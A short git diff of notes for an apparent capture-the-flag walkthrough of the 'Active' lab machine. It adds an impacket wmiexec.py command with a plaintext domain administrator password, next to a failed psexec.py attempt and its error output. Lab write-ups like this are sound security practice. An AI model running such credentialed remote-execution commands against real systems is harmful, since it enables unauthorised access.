@@ -40,6 +40,8 @@ python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py active.htb/SVC_TG
 won't work
 ```
 python3 /usr/share/doc/python3-impacket/examples/psexec.py active.htb/SVC_TGS:'GPPstillStandingStrong2k18'@active.htb
+or use wmiexec.py
+python3 /usr/share/doc/python3-impacket/examples/wmiexec.py active.htb/administrator:'Ticketmaster1968'@10.129.148.91
 
 [-] SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
 ```
